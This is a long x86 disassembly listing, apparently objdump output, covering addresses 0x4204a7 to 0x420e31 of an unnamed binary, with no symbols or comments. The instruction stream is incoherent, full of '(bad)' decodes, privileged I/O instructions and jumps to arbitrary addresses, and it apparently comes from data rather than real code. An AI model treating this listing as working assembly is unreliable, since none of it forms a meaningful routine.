  4204a7:	fwait
  4204a8:	adc    esp,DWORD PTR [edi-0x2947cab5]
  4204ae:	push   esp
  4204af:	hlt    
  4204b0:	add    edi,DWORD PTR ds:0x314e1fd6
  4204b6:	xchg   ebx,eax
  4204b7:	loopne 0x4204f3
  4204b9:	adc    eax,DWORD PTR [edx]
  4204bb:	jmp    0x4204ce
  4204bd:	push   ebp
  4204be:	outs   dx,DWORD PTR ds:[esi]
  4204bf:	mov    ch,0x9
  4204c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4204c2:	mov    cl,0x8e
  4204c4:	and    BYTE PTR [edx-0x40dfe381],cl
  4204ca:	fwait
  4204cb:	cwde   
  4204cc:	xor    al,0x39
  4204ce:	add    edx,DWORD PTR [edi+0x26a15528]
  4204d4:	cmp    esp,DWORD PTR [ebp+0x3a]
  4204d7:	and    ecx,DWORD PTR [edi+0x1f1c126d]
  4204dd:	pusha  
  4204de:	mov    esp,DWORD PTR ds:0xdeeeb83e
  4204e4:	pop    eax
  4204e5:	push   esi
  4204e6:	mov    al,0xe
  4204e8:	push   ds
  4204e9:	xchg   ebp,eax
  4204ea:	add    al,0xe4
  4204ec:	mov    ?,ebp
  4204ee:	and    eax,0xab9e26d7
  4204f3:	dec    esp
  4204f4:	aam    0xd1
  4204f6:	stos   BYTE PTR es:[edi],al
  4204f7:	xchg   BYTE PTR [ebx],al
  4204f9:	xlat   BYTE PTR ds:[ebx]
  4204fa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4204fb:	mov    al,ds:0xb6656e61
  420500:	ss (bad) 
  420502:	mov    ah,0xf8
  420504:	mov    ebp,0xf270d8c3
  420509:	ss ds mov edx,0x5e7226a2
  420510:	test   eax,0x2e41c1f7
  420515:	and    ecx,0x72
  420518:	gs ds mov ecx,0xa8948b75
  42051f:	enter  0x6ae7,0x84
  420523:	repnz or DWORD PTR [ebx-0x15d97136],ecx
  42052a:	pop    ss
  42052b:	jmp    0x420523
  42052d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42052e:	push   edi
  42052f:	mov    ebp,DWORD PTR [ecx]
  420531:	push   0x63
  420533:	inc    ecx
  420534:	push   0xffffff9d
  420536:	cmp    BYTE PTR [ecx+ebx*1-0x53],bl
  42053a:	loope  0x42052a
  42053c:	imul   edx,DWORD PTR [esi],0x31
  42053f:	push   ebp
  420540:	aas    
  420541:	mov    ss,WORD PTR [ebx+ecx*8-0x4ede5af4]
  420548:	pop    esp
  420549:	jl     0x9f2fa202
  42054f:	mov    ebp,0xa2c4ca35
  420554:	push   ebp
  420555:	loope  0x420590
  420557:	adc    al,0x7b
  420559:	pop    es
  42055a:	push   ebx
  42055b:	outs   dx,BYTE PTR ds:[esi]
  42055c:	mov    ecx,0x1d8f756a
  420561:	push   0xffffffa1
  420563:	adc    DWORD PTR [eax],ebp
  420565:	add    al,0x6f
  420567:	es inc esp
  420569:	js     0x420513
  42056b:	and    BYTE PTR [di-0x7918],ch
  420570:	hlt    
  420571:	inc    ecx
  420572:	or     bl,bl
  420574:	dec    esp
  420575:	push   0x297b23e3
  42057a:	mov    dh,0x25
  42057c:	sub    ebx,DWORD PTR [ecx-0x6b]
  42057f:	mov    esi,0x4a17590b
  420584:	fidivr WORD PTR [eax+0x2accb33c]
  42058a:	mov    ds:0xdef40685,al
  42058f:	adc    dh,ah
  420591:	ins    BYTE PTR es:[edi],dx
  420592:	imul   esi,DWORD PTR [ecx+0x22],0xa12ab1a9
  420599:	sar    DWORD PTR [ebp-0x10],0x3f
  42059d:	aad    0x34
  42059f:	jp     0x420557
  4205a1:	retf   0x7682
  4205a4:	icebp  
  4205a5:	dec    edx
  4205a6:	pop    ebx
  4205a7:	mov    DWORD PTR [edi+ebx*8-0x7d],esi
  4205ab:	xor    al,al
  4205ad:	mov    ah,0x5a
  4205af:	aaa    
  4205b0:	xchg   edx,eax
  4205b1:	add    ebp,DWORD PTR ds:0x49349626
  4205b7:	sbb    eax,0xf7759048
  4205bc:	mov    eax,0x76eed73
  4205c1:	cmp    DWORD PTR [eax+0x2c],0x7e
  4205c5:	je     0x420561
  4205c7:	data16 sahf 
  4205c9:	ficom  WORD PTR [edi]
  4205cb:	loopne 0x4205f6
  4205cd:	mov    al,BYTE PTR ds:0x55e301fa
  4205d3:	inc    esi
  4205d4:	fidiv  DWORD PTR [eax-0x6f]
  4205d7:	dec    ebp
  4205d8:	scas   eax,DWORD PTR es:[edi]
  4205d9:	adc    eax,0xa9f1fc35
  4205de:	mov    dl,0x67
  4205e0:	add    esi,edi
  4205e2:	mov    ebx,DWORD PTR [ecx]
  4205e4:	add    ch,0x41
  4205e7:	adc    esi,ecx
  4205e9:	sub    al,0xd3
  4205eb:	sbb    DWORD PTR [edi],ebx
  4205ed:	cwde   
  4205ee:	rcr    BYTE PTR [eax+0x27],cl
  4205f1:	test   al,0x4f
  4205f3:	jno    0x420645
  4205f5:	in     al,0x3
  4205f7:	cdq    
  4205f8:	or     BYTE PTR [ecx-0x7cef139e],al
  4205fe:	nop
  4205ff:	scas   eax,DWORD PTR es:[edi]
  420600:	dec    esp
  420601:	adc    BYTE PTR [eax-0x78],cl
  420604:	jp     0x4205cf
  420606:	ror    DWORD PTR [edx+0x4d7590],0x64
  42060d:	xchg   ecx,eax
  42060e:	xor    BYTE PTR [eax+eiz*1+0x51],al
  420612:	repnz mov ?,WORD PTR [esp+ebx*1-0x2c1ad72b]
  42061a:	das    
  42061b:	dec    esp
  42061c:	push   eax
  42061d:	test   eax,0x277a8ffb
  420622:	or     al,0xd
  420624:	and    al,0x70
  420626:	or     cl,BYTE PTR [eax]
  420628:	cdq    
  420629:	jp     0x420640
  42062b:	sbb    esi,DWORD PTR [edi-0x61511fea]
  420631:	adc    DWORD PTR [edi+esi*1+0x745f0b73],esp
  420638:	pushf  
  420639:	fwait
  42063a:	add    eax,0x7ba024a4
  42063f:	aam    0x67
  420641:	mov    dh,0xf5
  420643:	stc    
  420644:	pop    eax
  420645:	sub    ecx,eax
  420647:	pop    edi
  420648:	inc    edi
  420649:	pop    ss
  42064a:	push   ecx
  42064b:	sbb    eax,0xe060eab9
  420650:	pop    ss
  420651:	pop    esi
  420652:	jne    0x420614
  420654:	aad    0xf6
  420656:	loopne 0x42060c
  420658:	shl    BYTE PTR [ebx-0x3d],cl
  42065b:	push   eax
  42065c:	mov    al,ds:0xe1ebcd0b
  420661:	xchg   ebp,eax
  420662:	ins    BYTE PTR es:[edi],dx
  420663:	aad    0xe3
  420665:	cmc    
  420666:	inc    edx
  420667:	icebp  
  420668:	ds adc ch,0xca
  42066c:	dec    edi
  42066d:	int    0x67
  42066f:	dec    ebp
  420670:	mov    ecx,0xac3aeb8b
  420675:	and    eax,0xbcb89cff
  42067a:	add    eax,0xecdb7334
  42067f:	inc    ebp
  420680:	mov    ecx,0xb6938d3d
  420685:	std    
  420686:	cmp    DWORD PTR [edx+0x79],esi
  420689:	loopne 0x4206fc
  42068b:	xchg   edx,eax
  42068c:	push   es
  42068d:	sbb    ebx,DWORD PTR [edi]
  42068f:	std    
  420690:	stos   DWORD PTR es:[edi],eax
  420691:	sub    ah,BYTE PTR [edx-0x8]
  420694:	aam    0xda
  420696:	adc    eax,DWORD PTR [edx]
  420698:	inc    ebp
  420699:	ret    
  42069a:	pop    edi
  42069b:	jmp    0x50488877
  4206a0:	in     al,dx
  4206a1:	loopne 0x42069c
  4206a3:	aas    
  4206a4:	sub    bh,al
  4206a6:	push   ebp
  4206a7:	loopne 0x42070b
  4206a9:	and    eax,DWORD PTR [eax]
	...
  420883:	add    BYTE PTR [eax],al
  420885:	add    BYTE PTR [ecx+0x6a],ah
  420888:	jmp    0xffd9f3a4
  42088d:	jle    0x420895
  42088f:	js     0x42083e
  420891:	aam    0x2
  420893:	aas    
  420894:	leave  
  420895:	hlt    
  420896:	ins    DWORD PTR es:[edi],dx
  420897:	jle    0x42089a
  420899:	add    BYTE PTR [edx],ah
  42089b:	pop    es
  42089c:	add    BYTE PTR [eax],al
  42089e:	cwde   
  42089f:	mov    ebp,DWORD PTR [esi]
  4208a1:	fisub  DWORD PTR [edi]
  4208a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4208a4:	mov    ds:0x68d359fd,eax
  4208a9:	push   ss
  4208aa:	outs   dx,DWORD PTR ds:[esi]
  4208ab:	inc    esp
  4208ac:	scas   al,BYTE PTR es:[edi]
  4208ad:	mov    eax,ds:0xf4404b97
  4208b2:	push   ss
  4208b3:	add    al,0x11
  4208b5:	inc    ecx
  4208b6:	popa   
  4208b7:	or     BYTE PTR [ebp+0x3ed90106],dh
  4208bd:	call   0x3a3ce22b
  4208c2:	ret    0x9744
  4208c5:	mov    eax,ds:0xdd1e0c3b
  4208ca:	dec    esi
  4208cb:	xor    al,0xaa
  4208cd:	ss into 
  4208cf:	push   edx
  4208d0:	(bad)  
  4208d1:	daa    
  4208d2:	enter  0x8c8c,0xb4
  4208d6:	in     al,0x0
  4208d8:	mov    dh,0xa1
  4208da:	hlt    
  4208db:	inc    esi
  4208dc:	adc    ch,BYTE PTR [edi-0xb]
  4208df:	lods   eax,DWORD PTR ds:[esi]
  4208e0:	mov    ecx,0xcb0904ac
  4208e5:	into   
  4208e6:	in     al,0x3c
  4208e8:	pop    edi
  4208e9:	pop    esp
  4208ea:	repnz lahf 
  4208ec:	ja     0x4208e8
  4208ee:	popf   
  4208ef:	or     al,0x58
  4208f1:	adc    cl,cl
  4208f3:	and    eax,0xfc043a47
  4208f8:	or     BYTE PTR [ebx+0x30],ah
  4208fb:	sub    BYTE PTR [ebx-0x2e],ah
  4208fe:	fst    DWORD PTR [ecx+0x27]
  420901:	out    dx,eax
  420902:	in     eax,dx
  420903:	shl    DWORD PTR [esi+0x620306cb],0x3f
  42090a:	mov    WORD PTR [ebp-0x51b8646b],cs
  420910:	data16 sbb ah,dl
  420913:	lds    esp,FWORD PTR [edi-0x19]
  420916:	je     0x4208e5
  420918:	cdq    
  420919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42091a:	jg     0x42094a
  42091c:	dec    ebx
  42091d:	dec    edi
  42091e:	or     ecx,esp
  420920:	or     al,0x1c
  420922:	sbb    eax,0xd0f6f0d9
  420927:	fcmovnu st,st(1)
  420929:	in     al,dx
  42092a:	lea    eax,[ebx+eax*4]
  42092d:	mov    eax,ds:0xb85f2a4f
  420932:	fst    QWORD PTR [eax-0x4a85f62d]
  420938:	mov    dl,0x7c
  42093a:	jo     0x4208cd
  42093c:	adc    DWORD PTR [esi+0x55efd989],ebp
  420942:	push   esp
  420943:	lds    ecx,FWORD PTR ds:0xf6c640d8
  420949:	mov    edx,0xc6f74a51
  42094e:	jmp    0x722:0x34d3a3f8
  420955:	ss xchg ebp,eax
  420957:	mov    ecx,0xac7a3196
  42095c:	ss jne 0x420991
  42095f:	inc    eax
  420960:	aam    0x9b
  420962:	push   cs
  420963:	shr    BYTE PTR [ebp-0x6b],0xd
  420967:	aaa    
  420968:	jmp    FWORD PTR [edi+ebp*4]
  42096b:	ret    0xaccb
  42096e:	int    0xb3
  420970:	rol    bl,cl
  420972:	test   BYTE PTR es:[ebx+edx*8],cl
  420976:	in     eax,dx
  420977:	cli    
  420978:	mov    dh,0x6e
  42097a:	cwde   
  42097b:	mov    al,0xc1
  42097d:	mov    edi,DWORD PTR [eax-0x12]
  420980:	xchg   esi,eax
  420981:	lods   eax,DWORD PTR ds:[esi]
  420982:	mov    al,0xbc
  420984:	out    0x8d,al
  420986:	cs push 0x551363c3
  42098c:	loope  0x4209bd
  42098e:	mov    bl,0xf
  420990:	xchg   edi,eax
  420991:	repnz out 0x59,al
  420994:	aam    0x69
  420996:	pop    ebx
  420997:	icebp  
  420998:	ror    BYTE PTR [esi],0xca
  42099b:	jns    0x420941
  42099d:	lods   eax,DWORD PTR ds:[esi]
  42099e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42099f:	imul   edi,DWORD PTR [esi],0x73abe573
  4209a5:	pop    ds
  4209a6:	jecxz  0x420a0f
  4209a8:	ret    0x1ee3
  4209ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4209ac:	sub    esp,DWORD PTR [ebx-0x5f]
  4209af:	je     0x420999
  4209b1:	(bad)  
  4209b2:	adc    BYTE PTR [edx],al
  4209b4:	call   0x376a:0x9ddb440e
  4209bb:	jle    0x4209a4
  4209bd:	jmp    0x420a1c
  4209bf:	loop   0x420957
  4209c1:	mov    dh,0x60
  4209c3:	mov    BYTE PTR [edi],dl
  4209c5:	add    BYTE PTR [eax+ebx*2],bh
  4209c8:	lahf   
  4209c9:	je     0x420a45
  4209cb:	adc    DWORD PTR [edi-0x73],eax
  4209ce:	xchg   esp,eax
  4209cf:	cld    
  4209d0:	rol    DWORD PTR [esi],cl
  4209d2:	pusha  
  4209d3:	add    DWORD PTR [ebx+0x2eace3f5],edi
  4209d9:	aam    0xa2
  4209db:	cwde   
  4209dc:	inc    eax
  4209dd:	out    0xf3,eax
  4209df:	mov    WORD PTR [ebx+0x3fc74a30],?
  4209e5:	xor    ebx,eax
  4209e7:	retf   
  4209e8:	lods   al,BYTE PTR ds:[esi]
  4209e9:	loope  0x4209eb
  4209eb:	shl    eax,cl
  4209ed:	ret    
  4209ee:	xor    dl,BYTE PTR [esi]
  4209f0:	mov    ch,0x5
  4209f2:	or     BYTE PTR [ebx+edi*2-0x14],bl
  4209f6:	jns    0x420999
  4209f8:	fimul  WORD PTR ds:[edx-0x36a4be37]
  4209ff:	call   0x276d:0xa865e9f9
  420a06:	(bad)  
  420a07:	int    0x3d
  420a09:	adc    eax,edi
  420a0b:	out    dx,eax
  420a0c:	or     al,0x98
  420a0e:	push   eax
  420a0f:	pushf  
  420a10:	mov    dh,0x94
  420a12:	repnz gs out 0x45,eax
  420a16:	mov    esp,0x11facc3b
  420a1b:	fmul   QWORD PTR [ebx]
  420a1d:	push   edi
  420a1e:	or     DWORD PTR [ebx],ecx
  420a20:	and    eax,0xbdbfaba2
  420a25:	(bad)  
  420a26:	arpl   WORD PTR [eax-0x2761f712],ax
  420a2c:	sbb    DWORD PTR [eax],edx
  420a2e:	imul   esi,ecx,0x5a683a34
  420a34:	xchg   DWORD PTR ds:0x31f257fe,esi
  420a3a:	cmp    BYTE PTR [eax+eax*1-0x9],dh
  420a3e:	iret   
  420a3f:	mov    ebp,0x3e8f3e34
  420a44:	outs   dx,DWORD PTR ds:[esi]
  420a45:	push   ss
  420a46:	add    edx,DWORD PTR [edi]
  420a48:	sub    al,ch
  420a4a:	dec    eax
  420a4b:	xor    al,BYTE PTR [edi+0x1759fc93]
  420a51:	and    edi,DWORD PTR [ebx+0x0]
  420a54:	ja     0x420aa8
  420a56:	mov    cl,0x7
  420a58:	enter  0x53d5,0xb8
  420a5c:	pop    ecx
  420a5d:	aam    0xe8
  420a5f:	(bad)  
  420a60:	shr    BYTE PTR [ecx+0x1a],1
  420a63:	ret    0xca35
  420a66:	je     0x4209ea
  420a68:	cmp    cl,cl
  420a6a:	das    
  420a6b:	loope  0x4209f2
  420a6d:	ror    ebp,0x1b
  420a70:	jmp    0x2a39d18c
  420a75:	idiv   DWORD PTR [eax-0x5bbba61e]
  420a7b:	fwait
  420a7c:	adc    esi,DWORD PTR [edi]
  420a7e:	or     esp,DWORD PTR [ebx+ebp*8]
  420a81:	mov    dl,0x92
  420a83:	push   eax
  420a84:	xor    eax,0x8d4f2b23
  420a89:	rcl    BYTE PTR [esi],1
  420a8b:	sub    al,0x37
  420a8d:	adc    eax,0x55bb5ad0
  420a92:	fprem  
  420a94:	jmp    0xc03fa5b0
  420a99:	cmp    ah,dh
  420a9b:	ret    
  420a9c:	mov    ds,WORD PTR [edx]
  420a9e:	mov    esi,0x6386d924
  420aa3:	adc    DWORD PTR [edx-0x7d0c5b09],0x9366e5a0
  420aad:	jle    0x420ad5
  420aaf:	leave  
  420ab0:	mov    edi,0x99d419b9
  420ab5:	lahf   
  420ab6:	fwait
  420ab7:	mov    ch,0x4b
  420ab9:	cmp    esi,ebx
  420abb:	mov    dl,0x97
  420abd:	ja     0x420a80
  420abf:	jge    0x420b0b
  420ac1:	pop    esp
  420ac2:	sar    DWORD PTR [ebx-0x20],cl
  420ac5:	sbb    eax,0x608464da
  420aca:	jbe    0x420a9f
  420acc:	and    DWORD PTR [esi+0x37],0x2a250a45
  420ad3:	popa   
  420ad4:	sbb    eax,0xa61b6deb
  420ad9:	nop
  420ada:	adc    BYTE PTR [ecx+ecx*2-0x1d],al
  420ade:	iret   
  420adf:	iret   
  420ae0:	dec    esp
  420ae1:	adc    esi,edx
  420ae3:	sbb    al,0x38
  420ae5:	and    DWORD PTR [edx-0x4f],edi
  420ae8:	stos   DWORD PTR es:[edi],eax
  420ae9:	fstp   DWORD PTR [ebx]
  420aeb:	xchg   bh,dl
  420aed:	leave  
  420aee:	push   ebx
  420aef:	in     al,dx
  420af0:	cwde   
  420af1:	xrelease xchg BYTE PTR [edi+0x332acd12],ah
  420af8:	cmp    al,0x3
  420afa:	shl    BYTE PTR [ebp-0xa],1
  420afd:	fmul   QWORD PTR [edx-0x3898ec14]
  420b03:	adc    al,0xb
  420b05:	jmp    0x420b60
  420b07:	(bad)  
  420b08:	(bad)  
  420b0a:	mov    bl,0x44
  420b0c:	into   
  420b0d:	ror    DWORD PTR [eax],cl
  420b0f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b10:	jb     0x420b83
  420b12:	mov    eax,ds:0x7ba16a31
  420b17:	(bad)  
  420b18:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  420b1a:	inc    ecx
  420b1b:	iret   
  420b1c:	jo     0x420ab2
  420b1e:	or     eax,0x5bd8061f
  420b23:	mov    dl,0xc5
  420b25:	inc    esp
  420b26:	call   0xe6f84d63
  420b2b:	fwait
  420b2c:	push   edx
  420b2d:	mov    ebx,DWORD PTR [esi-0x45]
  420b30:	add    eax,0xd797c9ab
  420b35:	jle    0x420b36
  420b37:	fcmovne st,st(5)
  420b39:	or     dl,dl
  420b3b:	fdivr  QWORD PTR [ecx+0x1a]
  420b3e:	jge    0x420add
  420b40:	daa    
  420b41:	out    0x2,al
  420b43:	xchg   ch,ch
  420b45:	push   eax
  420b46:	mov    eax,ds:0xc8e35c60
  420b4b:	cmp    al,0xcd
  420b4d:	ds pop ss
  420b4f:	jbe    0x420afa
  420b51:	out    dx,al
  420b52:	hlt    
  420b53:	mov    ds:0x52fa1ddc,al
  420b58:	mov    eax,ds:0xea072c94
  420b5d:	bound  ecx,QWORD PTR [eax]
  420b5f:	adc    ebx,esp
  420b61:	mov    DWORD PTR [ecx],eax
  420b63:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420b64:	adc    BYTE PTR [ebx-0x67],ah
  420b67:	enter  0x1cfd,0x18
  420b6b:	push   esi
  420b6c:	retf   
  420b6d:	xchg   esp,eax
  420b6e:	and    esi,0xa78d5839
  420b74:	aad    0xaa
  420b76:	add    dh,al
  420b78:	(bad)  
  420b79:	shr    BYTE PTR [eiz*2-0x3943b5f9],1
  420b80:	cmp    ch,cl
  420b82:	lds    esp,FWORD PTR [ecx]
  420b84:	push   ebx
  420b85:	mov    edx,0x7df02a4c
  420b8a:	and    al,0x35
  420b8c:	stc    
  420b8d:	cld    
  420b8e:	stc    
  420b8f:	and    eax,esi
  420b91:	xor    BYTE PTR [edx-0x511f9093],bh
  420b97:	pusha  
  420b98:	mov    al,ds:0x1c109a93
  420b9d:	lods   al,BYTE PTR ds:[esi]
  420b9e:	jae    0x420b85
  420ba0:	in     eax,0x50
  420ba2:	lahf   
  420ba3:	retf   0x2a56
  420ba6:	dec    edi
  420ba7:	push   0xffffffad
  420ba9:	sahf   
  420baa:	xor    esi,DWORD PTR [edi]
  420bac:	or     dh,bl
  420bae:	jg     0x420b30
  420bb0:	lods   al,BYTE PTR ds:[esi]
  420bb1:	push   ebp
  420bb2:	xchg   edx,eax
  420bb3:	test   al,0x6e
  420bb5:	jno    0x420c34
  420bb7:	pusha  
  420bb8:	call   0x30925f04
  420bbd:	xchg   esp,eax
  420bbe:	and    dl,BYTE PTR ds:[ecx+edx*1]
  420bc2:	loop   0x420b9f
  420bc4:	fisubr WORD PTR [ecx]
  420bc6:	add    esp,DWORD PTR [edi+0x35]
  420bc9:	mov    edx,0xb55636a1
  420bce:	jle    0x420c32
  420bd0:	lock adc BYTE PTR [esi+0x34b60c5],0xb0
  420bd8:	jno    0x420c0b
  420bda:	adc    ecx,edx
  420bdc:	(bad)  
  420bdd:	loop   0x420b73
  420bdf:	mov    eax,0x165f407
  420be4:	mov    WORD PTR [ecx],gs
  420be6:	xchg   esi,eax
  420be7:	inc    eax
  420be8:	nop
  420be9:	jb     0x420c29
  420beb:	lods   al,BYTE PTR ds:[esi]
  420bec:	adc    ch,bh
  420bee:	pop    esi
  420bef:	push   ebx
  420bf0:	cld    
  420bf1:	fs test al,0xcb
  420bf4:	mov    eax,ds:0xfb2bb9ae
  420bf9:	les    eax,FWORD PTR [ecx-0x7d4cc481]
  420bff:	pop    ebx
  420c00:	push   ecx
  420c01:	ficom  WORD PTR [esi+0x2a]
  420c04:	xchg   ebx,eax
  420c05:	test   al,0xc2
  420c07:	in     eax,dx
  420c08:	pop    ss
  420c09:	loope  0x420bac
  420c0b:	pushf  
  420c0c:	add    cl,BYTE PTR [esi+0x62ad0c01]
  420c12:	pusha  
  420c13:	xchg   edi,eax
  420c14:	data16 sahf 
  420c16:	inc    ebp
  420c17:	jnp    0x420bf0
  420c19:	outs   dx,DWORD PTR ds:[esi]
  420c1a:	pop    esi
  420c1b:	dec    ebx
  420c1c:	fcom   DWORD PTR [edx-0x32346a55]
  420c22:	add    edx,DWORD PTR [ecx-0x248bcee1]
  420c28:	inc    eax
  420c29:	push   ebx
  420c2a:	xor    eax,0x7e470825
  420c2f:	jp     0x420c75
  420c31:	xor    edi,DWORD PTR [edx-0x2b75ce72]
  420c37:	dec    eax
  420c38:	pop    bp
  420c3a:	mov    al,0x8
  420c3c:	call   0x37b9c496
  420c41:	mov    ebx,0xb863cf25
  420c46:	xor    esi,edi
  420c48:	es dec ecx
  420c4a:	push   esi
  420c4b:	or     al,0xa
  420c4d:	cmc    
  420c4e:	shl    BYTE PTR [eax+0x13],cl
  420c51:	pushf  
  420c52:	mov    esp,esp
  420c54:	jge    0x420c1f
  420c56:	lock (bad) 
  420c58:	aad    0x6
  420c5a:	jecxz  0x420c84
  420c5c:	xchg   esp,eax
  420c5d:	sbb    ecx,DWORD PTR [ecx-0x43d41a45]
  420c63:	xchg   esp,eax
  420c64:	push   ecx
  420c65:	or     eax,DWORD PTR [edx+0x6a21dd0c]
  420c6b:	xor    DWORD PTR [eax+0x46],edi
  420c6e:	mov    ebx,0x53e5dabc
  420c73:	pop    es
  420c74:	sub    cl,ah
  420c76:	cs in  eax,dx
  420c78:	jl     0x420c8d
  420c7a:	in     al,0xa9
  420c7c:	dec    ebp
  420c7d:	repz and eax,0xab4fc717
  420c83:	das    
  420c84:	jl     0x420c16
  420c86:	(bad)  
  420c87:	retf   0x8cd6
  420c8a:	icebp  
  420c8b:	dec    eax
  420c8c:	dec    eax
  420c8d:	in     eax,0x7b
  420c8f:	cmp    ebx,ebp
  420c91:	pusha  
  420c92:	iret   
  420c93:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420c94:	jne    0x420c22
  420c96:	push   0x1d90bd92
  420c9b:	ja     0x420ccf
  420c9d:	inc    edx
  420c9e:	mov    ah,0x4b
  420ca0:	fwait
  420ca1:	lods   al,BYTE PTR ds:[esi]
  420ca2:	stc    
  420ca3:	adc    edx,DWORD PTR [ecx+0x51cfb990]
  420ca9:	sbb    BYTE PTR [ecx+ecx*1+0x63934603],al
  420cb0:	ss dec esp
  420cb2:	jne    0x420c3d
  420cb4:	loope  0x420c95
  420cb6:	sub    BYTE PTR [edi-0x3],bh
  420cb9:	or     eax,0x173cbbef
  420cbe:	mov    DWORD PTR [edx+0x4d],edi
  420cc1:	sbb    BYTE PTR [edi],0xa3
  420cc4:	pop    edi
  420cc5:	out    0xb6,eax
  420cc7:	or     eax,0x12ae608b
  420ccc:	mov    ds:0xa89de67c,al
  420cd1:	mov    cl,0x89
  420cd3:	dec    esp
  420cd4:	push   edi
  420cd5:	enter  0xa52b,0x7e
  420cd9:	fild   WORD PTR [edi+0xc]
  420cdc:	out    dx,al
  420cdd:	clc    
  420cde:	inc    esp
  420cdf:	mov    ds:0x155dcbec,eax
  420ce4:	mov    ch,0x40
  420ce6:	xor    edi,0xf
  420ce9:	push   cs
  420cea:	add    bl,al
  420cec:	inc    ebx
  420ced:	pop    es
  420cee:	dec    eax
  420cef:	ss push ds
  420cf1:	and    al,0xf5
  420cf3:	jmp    0x58e417d7
  420cf8:	rol    WORD PTR [eax],0x78
  420cfc:	adc    esi,DWORD PTR [esi+0x52e0d171]
  420d02:	sbb    esp,DWORD PTR [eax]
  420d04:	rol    esi,cl
  420d06:	xchg   esi,eax
  420d07:	mov    bl,0xa9
  420d09:	test   DWORD PTR [edi-0x71],0x9435a73e
  420d10:	sar    edi,cl
  420d12:	js     0x420d68
  420d14:	fist   DWORD PTR [edi]
  420d16:	sub    ebx,DWORD PTR [ecx+0x5b]
  420d19:	xchg   ch,dl
  420d1b:	or     eax,0xf3a2ce8f
  420d20:	sbb    edi,DWORD PTR [ebp+eax*2-0x6f]
  420d24:	clc    
  420d25:	sub    edx,DWORD PTR [ebp+0x46]
  420d28:	jecxz  0x420d39
  420d2a:	loop   0x420cd8
  420d2c:	retf   0xd0e7
  420d2f:	add    ah,BYTE PTR [eax-0x31403da8]
  420d35:	and    bh,ch
  420d37:	(bad)  [ebx]
  420d39:	fnstsw WORD PTR [edx]
  420d3b:	xchg   esi,eax
  420d3c:	arpl   bx,dx
  420d3e:	inc    esi
  420d3f:	jl     0x420cdd
  420d41:	popf   
  420d42:	push   ecx
  420d43:	pop    edi
  420d44:	push   ds
  420d45:	pop    ds
  420d46:	push   ds
  420d47:	mov    al,0xa5
  420d49:	test   BYTE PTR [edx],al
  420d4b:	or     eax,0x88608eaf
  420d50:	dec    edx
  420d51:	inc    dl
  420d53:	sub    al,0x38
  420d55:	div    DWORD PTR [edi-0x7]
  420d58:	dec    ecx
  420d59:	push   eax
  420d5a:	retf   0x73f9
  420d5d:	dec    edi
  420d5e:	(bad)  
  420d5f:	pop    edx
  420d60:	jno    0x420d3c
  420d62:	je     0x420da6
  420d64:	mov    bh,0x8f
  420d66:	mov    WORD PTR [ebx],ds
  420d68:	fimul  WORD PTR [edx]
  420d6a:	and    eax,0xbc088fab
  420d6f:	or     ecx,DWORD PTR [esi-0x3a2b29b4]
  420d75:	imul   DWORD PTR [eax+edi*2]
  420d78:	das    
  420d79:	mov    di,0x627b
  420d7d:	mov    esp,0x650ce42a
  420d82:	adc    eax,DWORD PTR ds:0xb6fa4229
  420d88:	fdiv   QWORD PTR [eax]
  420d8a:	aad    0xb6
  420d8c:	dec    ecx
  420d8d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d8e:	cmp    al,0x3e
  420d90:	ret    
  420d91:	lea    eax,[edx+0x78]
  420d94:	push   0x52a42aa7
  420d99:	xchg   esi,edx
  420d9b:	pxor   mm7,QWORD PTR [ebx+esi*8-0x67]
  420da0:	xchg   ecx,eax
  420da1:	xor    eax,0x7eb39af5
  420da6:	arpl   sp,bp
  420da8:	scas   al,BYTE PTR es:[edi]
  420da9:	push   cs
  420daa:	sub    BYTE PTR [eax+eiz*2],ch
  420dad:	fsub   DWORD PTR [eax+0x4a]
  420db0:	sub    eax,0x54e3dff8
  420db5:	pushf  
  420db6:	arpl   WORD PTR [ebp-0x35],si
  420db9:	pop    ds
  420dba:	shl    BYTE PTR [edx+0x5e],1
  420dbd:	test   al,0x24
  420dbf:	xchg   BYTE PTR [ecx-0x72a581a3],bh
  420dc5:	jp     0x420dc3
  420dc7:	(bad)  
  420dc8:	push   edx
  420dc9:	mov    eax,DWORD PTR [esi]
  420dcb:	dec    ebp
  420dcc:	mov    bh,0xb0
  420dce:	mov    ds:0x6926212d,eax
  420dd3:	or     eax,0x6c4ed5ae
  420dd8:	push   0x9
  420dda:	rol    BYTE PTR [eax],0xcc
  420ddd:	(bad)  
  420dde:	dec    edi
  420ddf:	add    eax,0x15d764f5
  420de4:	mov    esi,0x2700628a
  420de9:	adc    bh,bh
  420deb:	gs into 
  420ded:	push   ebx
  420dee:	cmp    eax,0x6dbdfc8a
  420df3:	jbe    0x420e57
  420df5:	jl     0x420db4
  420df7:	(bad)  
  420df8:	stos   DWORD PTR es:[edi],eax
  420df9:	sbb    al,0x31
  420dfb:	add    dl,BYTE PTR [ebx]
  420dfd:	outs   dx,DWORD PTR ds:[esi]
  420dfe:	test   DWORD PTR [ecx+0x72],edi
  420e01:	sbb    DWORD PTR [esi+edx*4+0x4d],ebx
  420e05:	add    DWORD PTR [edi+0x23],0xfffffff3
  420e09:	cmp    DWORD PTR [edi],0xfffffffb
  420e0c:	cmp    DWORD PTR [edx+0x5b31b2f0],ecx
  420e12:	ror    BYTE PTR [edi],0xef
  420e15:	sub    DWORD PTR [ebx-0x4a78a6d8],ebp
  420e1b:	scas   eax,DWORD PTR es:[edi]
  420e1c:	dec    edi
  420e1d:	adc    dh,BYTE PTR [edx+eiz*4+0x1f79efac]
  420e24:	(bad)
  420e27:	(bad)  
  420e28:	xor    al,0x6
  420e2a:	outs   dx,BYTE PTR ds:[esi]
  420e2b:	xor    edx,eax
  420e2d:	stc    
  420e2e:	or     al,0xa4
  420e30:	clc    
  420e31:	enter  0x102f,0xc3
